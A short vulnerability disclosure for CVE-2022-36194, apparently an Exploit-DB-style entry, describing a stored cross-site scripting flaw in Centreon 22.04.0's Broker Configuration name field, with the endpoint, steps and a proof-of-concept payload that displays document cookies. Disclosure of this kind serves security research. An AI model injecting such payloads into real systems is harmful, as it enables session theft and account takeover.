# CVE-2022-36194
```
# Exploit Title: Stored XSS in name parameter in Centreon version 22.04.0
# Date: 
# Exploit Author: syad, yunaranyancat, saitamang
# Vendor Homepage: Centreon
# Software Link: https://download.centreon.com/
# Version: 22.04.0
# Tested on: Centos 7
```
Centreon 22.04.0 is vulnerable to Cross Site Scripting (XSS) from the function Pollers > Broker Configuration by adding a crafted payload
into the name parameter.


go to this endpoint -> /centreon/main.get.php?p=60909 -> Pollers -> Broker Configuration -> Click Button "Add" and put the crafted payload below on section "Name" and save
```
payload --> test"><body onload=prompt(document.cookie)>
```

